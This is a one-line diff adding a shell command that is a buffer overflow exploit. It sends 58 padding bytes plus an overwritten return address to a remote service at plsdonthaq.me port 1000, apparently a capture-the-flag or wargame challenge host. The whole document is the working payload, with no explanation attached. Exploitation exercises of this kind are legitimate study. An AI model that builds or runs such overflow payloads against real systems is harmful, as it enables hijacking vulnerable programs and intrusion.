@@ -1,0 +1,1 @@
+cat - | python -c 'print "a"*58 + "\x59\x92\x04\x08"' | nc plsdonthaq.me 1000
